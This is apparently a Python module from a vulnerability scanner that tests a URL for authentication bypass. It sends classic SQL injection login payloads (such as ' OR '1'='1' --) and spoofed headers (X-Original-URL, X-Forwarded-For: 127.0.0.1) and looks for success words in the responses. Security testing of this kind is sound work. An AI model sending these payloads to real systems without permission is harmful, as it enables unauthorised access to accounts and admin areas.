"""P1 — Authentication Bypass detector."""

from __future__ import annotations

from typing import Any, List

from godrecon.modules.base import Finding
from godrecon.utils.logger import get_logger

logger = get_logger(__name__)

_SQLI_BYPASS_PAYLOADS = [
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1--",
    '" OR "1"="1"--',
    "admin' #",
    "') OR ('1'='1",
]

_AUTH_BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
]

_SUCCESS_INDICATORS = [
    "dashboard",
    "welcome",
    "logout",
    "profile",
    "admin panel",
    "successfully logged in",
]


class AuthBypassDetector:
    """Detects Authentication Bypass vulnerabilities."""

    def __init__(
        self,
        http_client: Any,
        safe_mode: bool = True,
        max_payloads: int = 10,
    ) -> None:
        self.http = http_client
        self.safe_mode = safe_mode
        self.max_payloads = max_payloads

    async def scan(self, url: str, params: List[str]) -> List[Finding]:
        """Scan for authentication bypass via SQLi and header manipulation."""
        findings: List[Finding] = []

        # Test SQLi-based auth bypass on parameters
        for param in params:
            for payload in _SQLI_BYPASS_PAYLOADS[: self.max_payloads]:
                try:
                    resp = await self.http.get(url, params={param: payload})
                    if not resp:
                        continue
                    body = (resp.get("body", "") or "").lower()
                    status = resp.get("status_code", 0)

                    if status == 200 and any(ind in body for ind in _SUCCESS_INDICATORS):
                        findings.append(Finding(
                            title=f"Authentication Bypass (SQLi) — {url}",
                            description=(
                                f"Parameter '{param}' may allow authentication bypass via SQLi. "
                                f"Payload: {payload}"
                            ),
                            severity="critical",
                            confidence=0.7,
                            data={
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "method": "GET",
                            },
                            tags=["auth-bypass", "p1", "critical", "sqli"],
                            evidence="Success indicator found in response after SQLi bypass payload",
                        ))
                        break
                except Exception as exc:
                    logger.debug("Auth bypass SQLi scan error: %s", exc)

        # Test header-based auth bypass
        for headers in _AUTH_BYPASS_HEADERS[: self.max_payloads]:
            try:
                resp = await self.http.get(url, headers=headers)
                if not resp:
                    continue
                status = resp.get("status_code", 0)
                body = (resp.get("body", "") or "").lower()

                if status == 200 and any(ind in body for ind in _SUCCESS_INDICATORS):
                    findings.append(Finding(
                        title=f"Authentication Bypass (Header Injection) — {url}",
                        description=(
                            f"Custom header may bypass authentication. "
                            f"Headers used: {headers}"
                        ),
                        severity="critical",
                        confidence=0.65,
                        data={"url": url, "headers": headers, "method": "GET"},
                        tags=["auth-bypass", "p1", "critical", "header-injection"],
                        evidence=f"Success indicator found after injecting headers: {headers}",
                    ))
            except Exception as exc:
                logger.debug("Auth bypass header scan error: %s", exc)

        return findings
